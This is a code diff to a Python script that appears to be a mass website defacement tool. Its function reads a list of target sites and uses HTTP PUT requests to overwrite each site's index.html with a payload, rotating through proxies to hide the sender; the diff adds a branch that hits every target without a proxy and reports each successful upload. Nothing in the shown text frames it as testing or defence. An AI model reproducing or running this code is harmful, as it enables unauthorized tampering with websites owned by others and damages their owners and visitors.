@@ -112,26 +112,45 @@ def white(script, target_file="targets.txt"):
         t.daemon = True  # allow the thread to be killed when the main program ends
         t.start()
         
-        for proxy in proxies:
-            try:
-                site = random.choice(target).strip()
-                if not site.startswith("http://"):
-                    site = "http://" + site
-                # Use a proxy from the list
-                s = requests.Session()
-                s.proxies = {'http': proxy, 'https': proxy}
-                req = s.put(site + "/index.html", data=op)
-                if req.status_code < 200 or req.status_code >= 250:
-                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
-                else:
-                    print(
-                        green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
-            except RequestException as e:
-                print(yellow + f"Proxy {proxy} died: {e}" + reset)
-                continue
-            except KeyboardInterrupt:
-                print
-                exit()
+        if proxies is not None:
+            for proxy in proxies:
+                try:
+                    site = random.choice(target).strip()
+                    if not site.startswith("http://"):
+                        site = "http://" + site
+                    # Use a proxy from the list
+                    s = requests.Session()
+                    s.proxies = {'http': proxy, 'https': proxy}
+                    req = s.put(site + "/index.html", data=op)
+                    if req.status_code < 200 or req.status_code >= 250:
+                        print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
+                    else:
+                        print(
+                            green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
+                except RequestException as e:
+                    print(yellow + f"Proxy {proxy} died: {e}" + reset)
+                    continue
+                except KeyboardInterrupt:
+                    print
+                    exit()
+        else:
+            for site in random.sample(target, len(target)):
+                try:
+                    if not site.startswith("http://"):
+                        site = "http://" + site
+                    # Use no proxy
+                    s = requests.Session()
+                    req = s.put(site + "/index.html", data=op)
+                    if req.status_code < 200 or req.status_code >= 250:
+                        print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
+                    else:
+                        print(
+                            green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
+                except RequestException:
+                    continue
+                except KeyboardInterrupt:
+                    print
+                    exit()
 
 def main(__bn__):
     print(__bn__)
